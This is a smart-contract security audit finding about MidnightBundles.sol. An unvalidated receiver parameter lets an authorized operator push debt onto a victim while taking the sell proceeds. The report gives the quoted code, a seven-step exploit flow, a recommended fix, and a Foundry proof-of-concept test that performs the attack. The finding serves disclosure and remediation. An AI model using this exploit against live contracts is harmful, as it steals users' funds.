### Title
Authorized Operator Can Force Victim Into Debt While Stealing Sell Proceeds via Unconstrained `receiver` - (File: src/periphery/MidnightBundles.sol)

### Summary

`supplyCollateralAndSellWithUnitsTarget` allows any address authorized by the taker on Midnight to call the function with `taker=victim` and `receiver=attacker`. The bundler pulls collateral from `msg.sender` (attacker), credits it to the victim's Midnight position, executes sell takes that accumulate debt on the victim, and then transfers the resulting loan token proceeds to the attacker-controlled `receiver` — with no check that `receiver` must equal `taker`. The victim is left holding unwanted debt and locked collateral while the attacker receives the proceeds.

### Finding Description

**Exact code path:**

`MidnightBundles.sol` line 127 — authorization gate:
```solidity
require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```
This passes when `isAuthorized[victim][attacker] == true`.

Lines 134–140 — collateral pulled from `msg.sender` (attacker), credited to `taker` (victim):
```solidity
pullToken(token, msg.sender, collateralSupplies[i].assets, collateralSupplies[i].permit);
forceApproveMax(token, MIDNIGHT);
IMidnight(MIDNIGHT).supplyCollateral(market, ..., taker);
```
`Midnight.supplyCollateral` (line 527) requires `isAuthorized[onBehalf][msg.sender]`, i.e., the bundler must be authorized by the victim — the standard precondition for bundler usage.

Lines 152–160 — take executed with `taker` (victim) as seller, `receiverIfTakerIsSeller = address(this)` (bundler):
```solidity
IMidnight(MIDNIGHT).take(takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), "")
```
In `Midnight.take` line 423: `address receiver = offer.buy ? receiverIfTakerIsSeller : ...` — loan tokens flow to the bundler.

Line 168 — bundler forwards loan tokens to the attacker-controlled `receiver`:
```solidity
SafeTransferLib.safeTransfer(loanToken, receiver, filledSellerAssets - referralFeeAssets);
```
**There is no check that `receiver == taker` or that `receiver` is controlled by the taker.** The attacker passes `receiver = attacker` at call time.

**Root cause:** The `receiver` parameter is fully attacker-controlled and is never validated against `taker`. The authorization check at line 127 only gates entry into the function; it does not constrain where the sell proceeds are sent.

**Exploit flow:**
1. Victim calls `setIsAuthorized(bundler, true, victim)` — normal bundler onboarding.
2. Victim calls `setIsAutsorized(attacker, true, victim)` — e.g., for a portfolio manager or automated strategy.
3. Attacker approves bundler to spend their collateral tokens.
4. Attacker calls `supplyCollateralAndSellWithUnitsTarget(targetUnits, 0, victim, attacker, collateralSupplies, takes, 0, address(0))`.
5. Bundler pulls collateral from attacker → credits victim's Midnight position.
6. Bundler calls `Midnight.take(... taker=victim ...)` — victim accumulates `targetUnits` of debt.
7. Bundler sends `filledSellerAssets` loan tokens to `receiver = attacker`.

**Why existing checks fail:** The only protection is the `isAuthorized` gate at line 127. It confirms the caller may act on behalf of the taker, but says nothing about where proceeds must go. The `Midnight.take` authorization check (line 346: `require(taker == msg.sender || isAuthorized[taker][msg.sender], TakerUnauthorized())`) is satisfied because `msg.sender` is the bundler, which is authorized by the victim. Neither Midnight nor the bundler enforces that the sell proceeds return to the taker.

### Impact Explanation

The victim ends up with debt they did not initiate and collateral locked against that debt, while the attacker receives all loan token proceeds. If the attacker supplies minimal collateral relative to the debt, the victim's position may be immediately undercollateralized and subject to liquidation. The victim suffers a direct, concrete financial loss equal to `filledSellerAssets` in loan tokens.

### Likelihood Explanation

**Preconditions:**
1. Victim has authorized the bundler on Midnight (required for any bundler usage — common).
2. Victim has authorized the attacker on Midnight (e.g., a delegated operator, automated strategy contract, or any address the victim trusted for another purpose).

Both conditions are realistic in a DeFi context where users delegate to multiple operators. The attack is repeatable as long as the authorization remains active and the attacker has collateral tokens to supply. The attacker's collateral cost is bounded by the collateral they supply, but they recover loan token proceeds, making the attack potentially self-funding or profitable depending on market prices.

### Recommendation

Constrain `receiver` to be `taker` when `msg.sender != taker`, or require an explicit on-chain consent from `taker` for the `receiver` address. The minimal fix is:

```solidity
require(receiver == taker || taker == msg.sender, Unauthorized());
```

placed immediately after the existing authorization check at line 127. This ensures that only the taker themselves (not a delegated operator) can redirect proceeds to a third-party address.

Alternatively, remove the `receiver` parameter entirely and always send proceeds to `taker`, consistent with the principle that authorization grants operational access but not asset redirection rights.

```solidity
function testAttackerForcesVictimIntoDebt() public {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    // Precondition 1: victim authorizes bundler (normal usage)
    vm.prank(victim);
    midnight.setIsAuthorized(address(midnightBundles), true, victim);

    // Precondition 2: victim authorizes attacker (e.g., for some other purpose)
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Attacker funds and approves collateral
    uint256 collateralAmt = _collateralAmount(0, targetUnits);
    deal(market.collateralParams[0].token, attacker, collateralAmt);
    vm.prank(attacker);
    ERC20(market.collateralParams[0].token).approve(address(midnightBundles), collateralAmt);

    CollateralSupply[] memory supplies = new CollateralSupply[](1);
    supplies[0] = CollateralSupply({collateralIndex: 0, assets: collateralAmt, permit: _noPermit()});

    Take[] memory takes = new Take[](1);
    takes[0] = Take({offer: offers[0], units: targetUnits, ratifierData: hex""});

    uint256 attackerLoanBefore = loanToken.balanceOf(attacker);

    // Attacker calls with taker=victim, receiver=attacker
    vm.prank(attacker);
    midnightBundles.supplyCollateralAndSellWithUnitsTarget(
        targetUnits, 0, victim, attacker, supplies, takes, 0, address(0)
    );

    // Assertions:
    assertGt(midnight.debtOf(id, victim), 0, "victim has debt");
    assertEq(midnight.collateral(id, victim, 0), collateralAmt, "victim has collateral");
    assertGt(loanToken.balanceOf(attacker), attackerLoanBefore, "attacker received proceeds");
    assertEq(loanToken.balanceOf(victim), 0, "victim received nothing");
}
```
